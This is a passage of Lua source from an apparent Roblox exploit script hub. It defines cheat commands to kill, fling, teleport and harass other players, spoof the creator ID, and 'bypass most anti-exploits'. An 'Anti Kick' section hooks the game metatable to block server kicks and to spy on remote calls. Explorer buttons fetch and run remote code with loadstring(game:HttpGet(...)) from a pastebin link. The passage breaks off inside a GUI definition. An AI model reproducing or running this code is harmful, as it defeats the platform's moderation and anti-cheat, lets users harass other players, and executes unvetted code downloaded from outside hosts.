		if copychatall then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
		end
	end)
end)

copychatplayer = nil
copychatall = false
copychatACTIVE = false
Commands.copychat = function(args)
	if args[1] then
		if string.lower(args[1]) == "all" or string.lower(args[1]) == "others" then
			copychatall = true
		else
			for i,v in pairs(findPlayer(args[1])) do
				if v ~= LP then
					copychatplayer = v
					copychatACTIVE = true
				end
			end
		end
	end
end

Commands.uncopychat = function(args)
	copychatall = false
	copychatACTIVE = false
end

Commands.newkill =  function(args)
	if hasTools() == false then
		Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
	else
		if args[1] then
			for i,plr in pairs(findSinglePlayer(args[1])) do
				for i,v in pairs(LP.Backpack:GetChildren())do
					LP.Character.Humanoid:EquipTool(v)
				end	
				for i,v in pairs(LP.Backpack:GetDescendants()) do
					if v:IsA("Tool") then
						v.Parent = LP.Character
						wait()
						v.Parent = plr.Character
					end
				end
				wait(0.4)
				LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4000000, -10, 200000))
			end
		end
	end
end

Commands.newattach =  function(args)
	if hasTools() == false then
		Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
	else
		if args[1] then
			for i,plr in pairs(findSinglePlayer(args[1])) do
				for i,v in pairs(LP.Backpack:GetChildren())do
					LP.Character.Humanoid:EquipTool(v)
				end	
				for i,v in pairs(LP.Backpack:GetDescendants()) do
					if v:IsA("Tool") then
						v.Parent = LP.Character
						wait()
						v.Parent = plr.Character
					end
				end
			end
		end
	end
end

Commands.newbring =  function(args)
	if hasTools() == false then
		Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
	else
		if args[1] then
			for i,plr in pairs(findSinglePlayer(args[1])) do
				local NOW = LP.Character.HumanoidRootPart.CFrame
				for i,v in pairs(LP.Backpack:GetChildren())do
					LP.Character.Humanoid:EquipTool(v)
				end	
				for i,v in pairs(LP.Backpack:GetDescendants()) do
					if v:IsA("Tool") then
						v.Parent = LP.Character
						wait()
						v.Parent = plr.Character
					end
				end
				wait(0.4)
				LP.Character.HumanoidRootPart.CFrame = NOW
				wait(0.4)
				LP.Character.HumanoidRootPart.CFrame = NOW
			end
		end
	end
end

Commands.spawn = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "ws" then
			spawnWS = args[2] or CurrentWalkspeed
			LP.Character.Humanoid.WalkSpeed = args[2] or CurrentWalkspeed
		elseif string.lower(tostring(args[1])) == "jp" then
			spawnJP = args[2] or CurrentJumppower
			LP.Character.Humanoid.JumpPower = args[2] or CurrentJumppower
		elseif string.lower(tostring(args[1])) == "hh" then
			spawnHH = args[2] or CurrentHipheight
			LP.Character.Humanoid.HipHeight = args[2] or CurrentHipheight
		elseif string.lower(tostring(args[1])) == "god" then
			spawningfegod = true
			FEGodmode()
		end
	end
end

Commands.unspawn = function(args)
	spawnWS = CurrentWalkspeed
	spawnJP = CurrentJumppower
	spawnHH = CurrentHipheight
	spawningfegod = false
	Notification("info", "Reset spawning stats", 5)
end

savingtoolsloop = false
Commands.autosavetool = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "on" then
			savingtoolsloop = true
		elseif string.lower(tostring(args[1])) == "off" then
			savingtoolsloop = false
		end
	end
end

modeFling = false
modeCompliment = false
modeMove = false
modeInfo = false
Commands.beginbot = function(args)
	if not args[1] then
		print("fling // compliment // move // info")
		Notification("info", ""..commandPrefix.."beginbot Modes printed", 5)
	else
		if string.lower(tostring(args[1])) == "fling" then
			modeFling = true
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello! I am Fling-Bot 5000! Say !fling [Player] to fling that player!", "All")
		elseif string.lower(tostring(args[1])) == "compliment" then
			modeCompliment = true
			complimentReady = true
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Good day, I am Compliment-Bot. Say !c [Player] to give them a compliment.", "All")
		elseif string.lower(tostring(args[1])) == "move" then
			modeMove = true
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi, I am movement bot. Commands you can use: !walk [Player], !bringbot, !follow [Player].", "All")
		elseif string.lower(tostring(args[1])) == "info" then
			modeInfo = true
			infoReady = true
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey, I'm Info-Bot. Commands you can use: !age [Player], !id [Player].", "All")
		end
	end
end

Commands.endbot = function(args)
	if not args[1] then
		modeFling = false
		modeCompliment = false
		modeMove = false
		modeInfo = false
	else
		if string.lower(tostring(args[1])) == "fling" then
			modeFling = false
		elseif string.lower(tostring(args[1])) == "compliment" then
			modeCompliment = false
		elseif string.lower(tostring(args[1])) == "move" then
			modeMove = false
		elseif string.lower(tostring(args[1])) == "info" then
			modeInfo = false
		end
	end
end

Commands.stopsit = function(args)
	stopsitting = true
end

Commands.gosit = function(args)
	stopsitting = false
end

chattingerror = true
Commands.chaterror = function(args)
	if chattingerror then
		chattingerror = false
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
		wait(4)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
		wait(3)
		chattingerror = true
	end
end

spawnpos = nil
spawningpos = true
Commands.spawnpoint = function(args)
	spawnpos = LP.Character.HumanoidRootPart.CFrame
	spawningpos = true
	Notification("info", "Spawn point has been set! Use "..commandPrefix.."nospawn to remove.", 6)
end

Commands.nospawn = function(args)
	spawningpos = false
	Notification("info", "Spawn point has been removed. Use "..commandPrefix.."spawnpoint to enable.", 6)
end

Commands.bypass = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "on" then
			bypassMODE = true
			Notification("warning", "Bypass mode turned on, this changes functions of "..commandPrefix.."fly and other commands to bypass most anti-exploits.", 7)
		elseif string.lower(tostring(args[1])) == "off" then
			bypassMODE = false
			Notification("warning", "Bypass mode has been turned off.", 7)
		end
	end
end

Commands.fixcam = function(args)
	gsWorkspace.CurrentCamera:Destroy()
	wait(0.1)
	game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character.Humanoid
	game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
	LP.CameraMinZoomDistance = 0.5
	LP.CameraMaxZoomDistance = 400
	LP.CameraMode = "Classic"
	LP.DevCameraOcclusionMode = CurrentNormal
end

Commands.gotoobj = function(args)
	if args[1] then
		for i,v in pairs(gsWorkspace:GetDescendants()) do
			if string.lower(v.Name) == string.lower(tostring(args[1])) then
				LP.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 3, 0)
			end
		end
	end
end

Commands.breakcam = function(args)
	gsWorkspace.CurrentCamera.CameraSubject = LP.Character.Head
end

Commands.inviscam = function(args)
	LP.DevCameraOcclusionMode = "Invisicam"
end

printobjKEY = ""
printobjCLICKING = false
printobjACTIVE = false

Commands.printobj = function(args)
	if args[1] then
		printobjKEY = string.sub(tostring(args[1]), 1, 1)
		printobjACTIVE = true
		printobjCLICKING = false
	else
		printobjKEY = ""
		printobjACTIVE = true
		printobjCLICKING = true
	end
end

Mouse.KeyDown:Connect(function(key) 
	if key == printobjKEY and printobjACTIVE == true then 
		if Mouse.Target then
			local path = Mouse.Target:GetFullName()
			local getPath = "game:GetService(\"Workspace\")"
			local getSpaces = ""
			local separate = {}
			local a = nil
			for v in string.gmatch(string.sub(path, 10), "[^.]+") do
				if string.match(v, " ") then
					a = "["..v.."]"
					table.insert(separate, a)
				else
					a = "."..v
					table.insert(separate, a)
				end
				getSpaces = table.concat(separate, "")
			end
			local fullPath = getPath..getSpaces
			print(fullPath)
		end 
	end
end)
Mouse.Button1Down:Connect(function()
	if printobjCLICKING == true and printobjACTIVE == true then
		if Mouse.Target then 
			local path = Mouse.Target:GetFullName()
			local getPath = "game:GetService(\"Workspace\")"
			local getSpaces = ""
			local separate = {}
			local a = nil
			for v in string.gmatch(string.sub(path, 10), "[^.]+") do
				if string.match(v, " ") then
					a = "["..v.."]"
					table.insert(separate, a)
				else
					a = "."..v
					table.insert(separate, a)
				end
				getSpaces = table.concat(separate, "")
			end
			local fullPath = getPath..getSpaces
			print(fullPath)
		end 
	end
end)

Commands.unprintobj = function(args)
	printobjACTIVE = false
	printobjCLICKING = false
end

Commands.hotkeyfc = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "goto" then
			fchotkeymode = "goto"
		elseif string.lower(tostring(args[1])) == "unfc" then
			fchotkeymode = "unfc"
		end
		fullUpdate()
	end
end

Commands.carpet = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if v ~= nil then
				annoying = true
				annplr = v
				local carpetAnimation = Instance.new("Animation")
				carpetAnimation.AnimationId = "rbxassetid://282574440"
				carpetTrack = LP.Character.Humanoid:LoadAnimation(carpetAnimation)
				carpetTrack:Play(.1, 1, 1)
			end
		end
	end
end

Commands.uncarpet = function(args)
	annoying = false
	carpetTrack:Stop()
end

Commands.brickcreate = function(args)
	if args[1] then
		local createPosition = LP.Character.HumanoidRootPart.CFrame
		if args[2] and args[3] and args[4] then
			createPosition = CFrame.new(Vector3.new(args[2], args[3], args[4]))
		else
			createPosition = LP.Character.HumanoidRootPart.CFrame
		end
		for i = 1, args[1] do
			LP.Character.HumanoidRootPart.CFrame = createPosition
			run(commandPrefix.."blockhats")
			wait(0.2)
			run(commandPrefix.."drophats")
			wait(0.2)
			run(commandPrefix.."reset")
			wait(6)
		end
	end
end

Commands.forward = function(args)
	if args[1] then
		forwardSpeed = args[1]
	else
		forwardSpeed = 1
	end
	cmdForward = true
end

Commands.unforward = function(args)
	cmdForward = false
end

Commands.id = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account ID: "..v.UserId.."!", "All")
		end
	end
end

Commands.spinhats = function(args) -- Credit to xFunnieuss
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
			local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
			if v.Handle.AccessoryWeld then
				v.Handle.AccessoryWeld:Destroy()
			end
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinObj = keep
			spinTOhead = true
		end
	end
end

Commands.unspinhats = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			pcall(function()
				run(commandPrefix.."drophats")
				wait(2)
				v.Handle.spin:Destroy()
				v.Handle.keep:Destroy()
			end)
		end
	end
end

savedmap = {}
Commands.savemap = function(args)
	for i,v in pairs(gsWorkspace:GetChildren()) do
		v.Archivable = true
		if not v:IsA("Terrain") and not v:IsA("Camera") then
			if not gsPlayers:FindFirstChild(v.Name) then
				table.insert(savedmap, v:Clone())
			end
		end
	end
	clientSided()
end

Commands.loadmap = function(args)
	for i,v in pairs(gsWorkspace:GetChildren()) do
		if not v:IsA("Terrain") and not v:IsA("Camera") then
			if not gsPlayers:FindFirstChild(v.Name) then
				pcall(function()
					v:Destroy()
				end)
			end
		end
	end
	for i,a in ipairs(savedmap) do
		a:Clone().Parent = gsWorkspace
	end
	clientSided()
end

Commands.creatorid = function(args)
	LP.UserId = game.CreatorId
end

Commands.gameid = function(args)
	Notification("info", "Current game's ID = "..game.GameId, 8)
end

Commands.delobj = function(args)
	if args[1] then
		for i,v in pairs(gsWorkspace:GetDescendants()) do
			if string.lower(v.Name) == string.lower(tostring(args[1])) then
				v:Destroy()
				clientSided()
			end
		end
	end
end

Commands.glide = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			local goal = {}
			goal.CFrame = v.Character.HumanoidRootPart.CFrame
			local defaultSpeed = 3
			if args[2] then
				if tonumber(args[2]) < 10 then
					defaultSpeed = tonumber(args[2])
				else
					defaultSpeed = 5
				end
			else
				defaultSpeed = 3
			end
			local goalFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(defaultSpeed, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), goal)
			goalFunction:Play()
		end
	end
end

stutterON = false
Commands.stutter = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "on" then
			stutterON = true
		elseif string.lower(tostring(args[1])) == "off" then
			stutterON = false
			wait(0.4)
			LP.Character.HumanoidRootPart.Anchored = false
		end 
	end
end

spawn(function()
	while wait(0.1) do
		if stutterON == true then
			LP.Character.HumanoidRootPart.Anchored = false
			wait(0.1)
			LP.Character.HumanoidRootPart.Anchored = true
		end
	end
end)

Commands.platform = function(args)
	local a = Instance.new("Part")
	a.Parent = gsWorkspace
	a.Size = Vector3.new(10, 1, 10)
	a.Anchored = true
	a.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
	LP.Character.HumanoidRootPart.CFrame = a.CFrame + Vector3.new(0, 2, 0)
	clientSided()
	wait(20)
	a:Destroy()
end

Commands.servertime = function(args)
	Notification("info", "Server time is "..math.ceil(tonumber(gsWorkspace.DistributedGameTime)).." seconds.", 8)
end

Commands.ride = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://179224234"
			RIDEtrack = LP.Character.Humanoid:LoadAnimation(Anim)
			rideACTIVE = true
			ridePLAYER = v
			RIDEtrack:Play()
		end
	end
end

Commands.unride = function(args)
	RIDEtrack:Stop()
	rideACTIVE = false
end

Commands.cmute = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/mute "..v.Name, "All")
			clientSided()
		end
	end
end

Commands.uncmute = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/unmute "..v.Name, "All")
		end
	end
end

Commands.hat = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://282574440"
			HATtrack = LP.Character.Humanoid:LoadAnimation(Anim)
			rideACTIVE = true
			ridePLAYER = v
			HATtrack:Play()
			view(v)
		end
	end
end

Commands.unhat = function(args)
	HATtrack:Stop()
	rideACTIVE = false
	view(LP)
end

--[[Commands.spawnreset = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "on" then
			spawningatreset = true
		elseif string.lower(tostring(args[1])) == "off" then
			spawningatreset = false
		end
	end
end]]

Commands.chat = function(args)
	if args[1] then
		local Chatmsg = table.concat(args, " ")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Chatmsg, "All")
	end
end

-- findPlayer function (ALL, OTHERS, ME, NOOBS, VETERANS, OLDVETERANS, FRIENDS, NOFRIENDS, DEFAULT, RANDOM, SAMETEAM, NOTEAM, OTHERTEAM, TEAMname)
function findPlayer(plr)
    local players = {}
    local find = plr:lower()
	local getAllNames = getmultipleplayers(find)
	for i,mplr in pairs(getAllNames) do
    if mplr == "all" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            table.insert(players,v)
        end
    elseif mplr == "others" then
        for i,v in pairs(gsPlayers:GetPlayers()) do
            if v.Name ~= LP.Name then
                table.insert(players,v)
            end
        end 
	elseif mplr == "me" then
		table.insert(players,LP)
	elseif mplr == "noobs" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.AccountAge <= 3 then
				table.insert(players,v)
			end
		end
	elseif mplr == "veterans" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.AccountAge >= 365 then
				table.insert(players,v)
			end
		end
	elseif mplr == "oldveterans" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.AccountAge >= 1500 then
				table.insert(players,v)
			end
		end
	elseif mplr == "friends" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
				table.insert(players,v)
			end
		end
	elseif mplr == "nofriends" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if not v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
				table.insert(players,v)
			end
		end
	elseif mplr == "default" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") then
				table.insert(players,v)
			end
		end
	elseif mplr == "random" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			table.insert(players,v[math.random(1, #v)])
		end
	elseif mplr == "sameteam" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.Team == LP.Team then
				table.insert(players,v)
			end
		end
	elseif mplr == "noteam" then
		for i,v in pairs(gsPlayers:GetPlayers()) do
			if v.Team == nil then
				table.insert(players,v)
			end
		end
	elseif mplr == "otherteam" then
			for i,v in pairs(gsPlayers:GetPlayers()) do
				if v.Team ~= LP.Team then
					table.insert(players,v)
				end
			end
	elseif string.sub(mplr, 1, 4) == "team" then
			for i,v in pairs(gsPlayers:GetPlayers()) do
				local spaceTEAM = {}
				for teamValues in (string.gmatch(string.sub(mplr, 5), "[^_]+")) do
					spaceTEAM[#spaceTEAM + 1] = teamValues
				end
				local gottrueteam = table.concat(spaceTEAM, " ")
				if string.lower(tostring(v.Team)) == string.lower(gottrueteam) then
					table.insert(players,v)
				end
			end	
	    else
			for i,v in pairs(gsPlayers:GetPlayers()) do
	            if string.lower(v.Name):sub(1, #mplr) == string.lower(mplr) then
	                table.insert(players,v)
	            end
			end
	    end
	end

    return players    
end
function getmultipleplayers(plr)
	local plrsgotten = {}
	for i in string.gmatch(plr,"[^,]+") do
		table.insert(plrsgotten,i)
	end
	return plrsgotten
end
function findSinglePlayer(plr)
    local players = {}
    local find = plr:lower()
	if find == "me" then
		table.insert(players,LP)
	else
		for i,v in pairs(gsPlayers:GetPlayers()) do
	        if string.lower(v.Name):sub(1, #find) == string.lower(find) then
	            table.insert(players,v)
	        end
		end
	end
	local oneplayer = {}
	pcall(function()
		table.insert(oneplayer, players[math.random(1, #players)])
	end)
	return oneplayer
end

-- Anti Kick

if getrawmetatable then
	function formatargs(getArgs,v)
		if #getArgs == 0 then 
			return "" 
		end
		
		local collectArgs = {}
		for k,v in next,getArgs do
			local argument = ""
			if type(v) == "string" then
				argument = "\""..v.."\""
			elseif type(v) == "table" then
				argument = "{" .. formatargs(v,true) .. "}"
			else
				argument = tostring(v)
			end
			if v and type(k) ~= "number" then
				table.insert(collectArgs,k.."="..argument)
			else
				table.insert(collectArgs,argument)
			end
		end
		return table.concat(collectArgs, ", ")
	end
	
	kicknum = 0
	local game_meta = getrawmetatable(game)
	local game_namecall = game_meta.__namecall
	local game_index = game_meta.__index
	local w = (setreadonly or fullaccess or make_writeable)
	pcall(w, game_meta, false)
	game_meta.__namecall = function(out, ...)
		local args = {...}
		local Method = args[#args]
		args[#args] = nil
		
		if Method == "Kick" and out == LP then
			kicknum = kicknum + 1
			warn("Blocked client-kick attempt "..kicknum)
			return
		end
		
		if antiremotes then
			if Method == "FireServer" or Method == "InvokeServer" then
				if out.Name ~= "CharacterSoundEvent" and out.Name ~= "SayMessageRequest" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Parent ~= "DefaultChatSystemChatEvents" then
					warn("Blocked remote: "..out.Name.." // Method: "..Method)
					return
				end
			end
		else
			if Method == "FireServer" or Method == "InvokeServer" then
				for i,noremote in pairs(blockedremotes) do
					if out.Name == noremote and out.Name ~= "SayMessageRequest" then
						warn("Blocked remote: "..out.Name.." // Method: "..Method)
						return
					end
				end
			end
		end
		
		if spyingremotes then
			if Method == "FireServer" or Method == "InvokeServer" then
				if out.Name ~= "CharacterSoundEvent" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Name ~= "SayMessageRequest" then
					local arguments = {}
					for i = 1,#args do
						arguments[i] = args[i]
					end
					local getScript = getfenv(2).script
					if getScript == nil then
						getScript = "??? (Not Found) ???"
					end
					warn("<> <> <> A "..out.ClassName.." has been fired! How to fire:\ngame."..out:GetFullName()..":"..Method.."("..formatargs(arguments)..")\n\nFired from script: ".. tostring(getScript:GetFullName()))
				end
			end
		end
		
		return game_namecall(out, ...)
	end
end

-- FE Check
function FEcheckDefault()
	if gsWorkspace.FilteringEnabled == true then
		createIntro("warning", "FE is enabled! Press "..commandPrefix.." to bring Command Bar.", 7)
	else
		createIntro("warning", "FE is disabled. Consider using a different script.", 7)
	end
end
FEcheckDefault()
end)

c:h1("Explorers")

c:Button("Dex v3",function()
   loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
end)

c:Button("Dex+",function()
   --Created by iiToxicity

loadstring(game:HttpGet('https://pastebin.com/raw/xAcGvYUW'))()

end)

c:Button("DexExplorer",function()
 CreateGui = function()
local NewGuiPart1 = Instance.new("ScreenGui")
local NewGuiPart2 = Instance.new("Frame")
local NewGuiPart3 = Instance.new("Frame")
local NewGuiPart4 = Instance.new("TextLabel")
local NewGuiPart5 = Instance.new("TextBox")
local NewGuiPart6 = Instance.new("Frame")
local NewGuiPart7 = Instance.new("Frame")
local NewGuiPart8 = Instance.new("TextButton")
local NewGuiPart9 = Instance.new("TextLabel")
local NewGuiPart10 = Instance.new("TextLabel")
local NewGuiPart11 = Instance.new("ImageLabel")
local NewGuiPart12 = Instance.new("Frame")
local NewGuiPart13 = Instance.new("Frame")
local NewGuiPart14 = Instance.new("Frame")
local NewGuiPart15 = Instance.new("TextButton")
local NewGuiPart16 = Instance.new("ImageLabel")
local NewGuiPart17 = Instance.new("TextButton")
local NewGuiPart18 = Instance.new("ImageLabel")
local NewGuiPart19 = Instance.new("TextButton")
local NewGuiPart20 = Instance.new("ImageLabel")
local NewGuiPart21 = Instance.new("TextButton")
local NewGuiPart22 = Instance.new("ImageLabel")
local NewGuiPart23 = Instance.new("TextButton")
local NewGuiPart24 = Instance.new("ImageLabel")
local NewGuiPart25 = Instance.new("TextButton")
local NewGuiPart26 = Instance.new("ImageLabel")
local NewGuiPart27 = Instance.new("TextButton")
local NewGuiPart28 = Instance.new("Frame")
local NewGuiPart29 = Instance.new("Frame")
local NewGuiPart30 = Instance.new("TextLabel")
local NewGuiPart31 = Instance.new("Frame")
local NewGuiPart32 = Instance.new("TextLabel")
local NewGuiPart33 = Instance.new("TextLabel")
local NewGuiPart34 = Instance.new("TextButton")
local NewGuiPart35 = Instance.new("TextLabel")
local NewGuiPart36 = Instance.new("TextLabel")
local NewGuiPart37 = Instance.new("Frame")
local NewGuiPart38 = Instance.new("Frame")
local NewGuiPart39 = Instance.new("TextLabel")
local NewGuiPart40 = Instance.new("Frame")
local NewGuiPart41 = Instance.new("TextButton")
local NewGuiPart42 = Instance.new("TextLabel")
local NewGuiPart43 = Instance.new("TextButton")
local NewGuiPart44 = Instance.new("TextBox")
local NewGuiPart45 = Instance.new("TextButton")
local NewGuiPart46 = Instance.new("TextLabel")
local NewGuiPart47 = Instance.new("TextLabel")
local NewGuiPart48 = Instance.new("Frame")
local NewGuiPart49 = Instance.new("TextLabel")
local NewGuiPart50 = Instance.new("Frame")
local NewGuiPart51 = Instance.new("TextButton")
local NewGuiPart52 = Instance.new("TextLabel")
local NewGuiPart53 = Instance.new("TextButton")
local NewGuiPart54 = Instance.new("Frame")
local NewGuiPart55 = Instance.new("TextLabel")
local NewGuiPart56 = Instance.new("Frame")
local NewGuiPart57 = Instance.new("TextLabel")
local NewGuiPart58 = Instance.new("TextButton")
local NewGuiPart59 = Instance.new("Frame")
local NewGuiPart60 = Instance.new("TextLabel")
local NewGuiPart61 = Instance.new("Frame")
local NewGuiPart62 = Instance.new("TextLabel")
local NewGuiPart63 = Instance.new("ScrollingFrame")
local NewGuiPart64 = Instance.new("TextButton")
local NewGuiPart65 = Instance.new("TextLabel")
local NewGuiPart66 = Instance.new("TextLabel")
local NewGuiPart67 = Instance.new("TextButton")
local NewGuiPart68 = Instance.new("TextButton")
local NewGuiPart69 = Instance.new("Frame")
local NewGuiPart70 = Instance.new("TextButton")
local NewGuiPart71 = Instance.new("TextBox")
local NewGuiPart72 = Instance.new("TextButton")
local NewGuiPart73 = Instance.new("TextButton")
local NewGuiPart74 = Instance.new("Frame")
local NewGuiPart75 = Instance.new("Frame")
local NewGuiPart76 = Instance.new("TextButton")
local NewGuiPart77 = Instance.new("ScrollingFrame")
local NewGuiPart78 = Instance.new("Frame")
local NewGuiPart79 = Instance.new("TextLabel")
local NewGuiPart80 = Instance.new("TextLabel")
local NewGuiPart81 = Instance.new("TextLabel")
local NewGuiPart82 = Instance.new("Frame")
local NewGuiPart83 = Instance.new("TextLabel")
local NewGuiPart84 = Instance.new("Frame")
local NewGuiPart85 = Instance.new("Frame")
local NewGuiPart86 = Instance.new("Frame")
local NewGuiPart87 = Instance.new("ImageButton")
local NewGuiPart88 = Instance.new("Frame")
local NewGuiPart89 = Instance.new("Frame")
local NewGuiPart90 = Instance.new("Frame")
local NewGuiPart91 = Instance.new("Frame")
local NewGuiPart92 = Instance.new("Frame")
local NewGuiPart93 = Instance.new("ImageButton")
local NewGuiPart94 = Instance.new("Frame")
local NewGuiPart95 = Instance.new("Frame")
local NewGuiPart96 = Instance.new("Frame")
local NewGuiPart97 = Instance.new("Frame")
local NewGuiPart98 = Instance.new("Frame")
local NewGuiPart99 = Instance.new("TextButton")
local NewGuiPart100 = Instance.new("Frame")
local NewGuiPart101 = Instance.new("Frame")
local NewGuiPart102 = Instance.new("TextButton")
local NewGuiPart103 = Instance.new("TextButton")
local NewGuiPart104 = Instance.new("TextButton")
local NewGuiPart105 = Instance.new("Frame")
local NewGuiPart106 = Instance.new("Frame")
local NewGuiPart107 = Instance.new("TextLabel")
local NewGuiPart108 = Instance.new("TextLabel")
local NewGuiPart109 = Instance.new("TextLabel")
local NewGuiPart110 = Instance.new("ImageLabel")
local NewGuiPart111 = Instance.new("Frame")
local NewGuiPart112 = Instance.new("Frame")
local NewGuiPart113 = Instance.new("TextLabel")
local NewGuiPart114 = Instance.new("Frame")
local NewGuiPart115 = Instance.new("Frame")
local NewGuiPart116 = Instance.new("TextLabel")
local NewGuiPart117 = Instance.new("TextLabel")
local NewGuiPart118 = Instance.new("TextButton")
local NewGuiPart119 = Instance.new("TextLabel")
local NewGuiPart120 = Instance.new("TextLabel")
local NewGuiPart121 = Instance.new("Frame")
local NewGuiPart122 = Instance.new("TextLabel")
local NewGuiPart123 = Instance.new("TextLabel")
local NewGuiPart124 = Instance.new("TextButton")
local NewGuiPart125 = Instance.new("TextLabel")
local NewGuiPart126 = Instance.new("TextLabel")
local NewGuiPart127 = Instance.new("Frame")
local NewGuiPart128 = Instance.new("TextLabel")
local NewGuiPart129 = Instance.new("TextLabel")
local NewGuiPart130 = Instance.new("TextButton")
local NewGuiPart131 = Instance.new("TextLabel")
local NewGuiPart132 = Instance.new("TextLabel")
local NewGuiPart133 = Instance.new("Frame")
local NewGuiPart134 = Instance.new("TextLabel")
local NewGuiPart135 = Instance.new("TextLabel")
local NewGuiPart136 = Instance.new("TextButton")
local NewGuiPart137 = Instance.new("TextLabel")
local NewGuiPart138 = Instance.new("TextLabel")
local NewGuiPart139 = Instance.new("TextLabel")
local NewGuiPart140 = Instance.new("Frame")
local NewGuiPart141 = Instance.new("Frame")
local NewGuiPart142 = Instance.new("TextLabel")
local NewGuiPart143 = Instance.new("TextButton")
local NewGuiPart144 = Instance.new("TextBox")
local NewGuiPart145 = Instance.new("Frame")
local NewGuiPart146 = Instance.new("TextButton")
local NewGuiPart147 = Instance.new("TextLabel")
local NewGuiPart148 = Instance.new("TextLabel")
local NewGuiPart149 = Instance.new("Frame")
local NewGuiPart150 = Instance.new("Frame")
local NewGuiPart151 = Instance.new("TextLabel")
local NewGuiPart152 = Instance.new("TextLabel")
local NewGuiPart153 = Instance.new("BindableFunction")
local NewGuiPart154 = Instance.new("BindableFunction")
local NewGuiPart155 = Instance.new("BindableFunction")
local NewGuiPart156 = Instance.new("BindableFunction")
local NewGuiPart157 = Instance.new("BindableEvent")
local NewGuiPart158 = Instance.new("BindableFunction")
local NewGuiPart159 = Instance.new("BindableFunction")
local NewGuiPart160 = Instance.new("BindableEvent")
local NewGuiPart161 = Instance.new("BindableFunction")
local NewGuiPart162 = Instance.new("BindableFunction")
local NewGuiPart163 = Instance.new("BindableEvent")
-- Properties

NewGuiPart1.Name = "Dex"

NewGuiPart2.Name = "PropertiesFrame"
NewGuiPart2.Parent = NewGuiPart1
NewGuiPart2.Active = true
NewGuiPart2.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart2.BackgroundTransparency = 0.10000000149012
NewGuiPart2.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart2.Position = UDim2.new(1, 0, 0.5, 36)
NewGuiPart2.Size = UDim2.new(0, 300, 0.5, -36)

NewGuiPart158.Name = "GetApi"
NewGuiPart158.Parent = NewGuiPart2
NewGuiPart158.Archivable = true

NewGuiPart159.Name = "GetAwaiting"
